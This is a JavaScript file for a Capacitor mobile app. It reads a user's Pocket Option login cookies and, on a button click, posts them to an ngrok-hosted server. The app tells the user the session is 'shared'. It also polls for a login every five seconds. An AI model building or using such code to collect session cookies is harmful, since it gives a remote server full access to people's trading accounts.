import { CapacitorCookies } from '@capacitor/core';

const statusText = document.getElementById('status-text');
const captureBtn = document.getElementById('capture-btn');

async function captureSession() {
    statusText.innerText = "Capturing cookies...";

    try {
        // CapacitorCookies can access cookies for any domain if configured correctly
        const cookieRet = await CapacitorCookies.getCookies({
            url: 'https://pocketoption.com'
        });

        console.log('Captured Cookies:', cookieRet);

        const cookiesArray = Object.keys(cookieRet).map(key => ({
            name: key,
            value: cookieRet[key],
            domain: '.pocketoption.com',
            path: '/'
        }));

        if (cookiesArray.length < 5) {
            statusText.innerText = "Error: Login first!";
            alert("Please login to Pocket Option before capturing.");
            return;
        }

        // Send to Niels Server
        // Note: You'll need to handle authentication here (e.g. token in localStorage)
        const token = localStorage.getItem('token');

        const response = await fetch('https://harlan-echolalic-ulysses.ngrok-free.dev/api/session/capture', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${token}`
            },
            body: JSON.stringify({
                cookies: cookiesArray,
                platform: 'android',
                userAgent: navigator.userAgent
            })
        });

        const result = await response.json();
        if (result.success) {
            statusText.innerText = "✅ Session Shared!";
            alert("Success! Your session is now shared with the server. You can return to the dashboard.");
        } else {
            statusText.innerText = "❌ Upload failed";
        }

    } catch (err) {
        console.error(err);
        statusText.innerText = "❌ Capture Error";
    }
}

captureBtn.addEventListener('click', captureSession);

// Auto-check on interval?
setInterval(async () => {
    const cookieRet = await CapacitorCookies.getCookies({ url: 'https://pocketoption.com' });
    if (cookieRet['PHPSESSID'] || cookieRet['token']) {
        statusText.innerText = "Login detected!";
    }
}, 5000);
